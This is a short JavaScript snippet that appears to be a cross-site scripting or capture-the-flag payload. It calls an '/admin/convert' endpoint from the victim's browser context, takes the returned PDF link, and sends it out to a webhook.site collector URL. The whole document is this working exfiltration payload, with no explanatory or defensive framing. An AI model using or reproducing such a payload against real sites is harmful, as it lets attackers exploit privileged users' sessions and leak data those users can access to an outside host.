// Generate a random HTML code string
const htmlCode = "<h1>test</h1>";

// Define the URL for the API endpoint
const apiEndpoint = '/admin/convert';

// Send the HTML code to the API endpoint using POST method
const xhr1 = new XMLHttpRequest();
xhr1.open('POST', apiEndpoint);
xhr1.setRequestHeader('Content-Type', 'application/json');
xhr1.onload = function() {
  // Extract the pdfLink from the response
  const response = JSON.parse(xhr1.responseText);
  const pdfLink = response.pdfLink;

  // Define the URL for the webhook endpoint
  const webhookEndpoint = `https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39?pdfLink=${encodeURIComponent(pdfLink)}`;

  // Send the pdfLink to the webhook endpoint using GET method
  const xhr2 = new XMLHttpRequest();
  xhr2.open('GET', webhookEndpoint);
  xhr2.onload = function() {
    // Log the webhook response
    console.log(xhr2.responseText);
  };
  xhr2.onerror = function() {
    // Handle any errors that occur during the webhook request
    console.error(`Webhook error: ${xhr2.statusText}`);
  };
  xhr2.send();
};
xhr1.onerror = function() {
  // Handle any errors that occur during the API request
  console.error(`API error: ${xhr1.statusText}`);
};
xhr1.send(JSON.stringify({ htmlCode: htmlCode }));
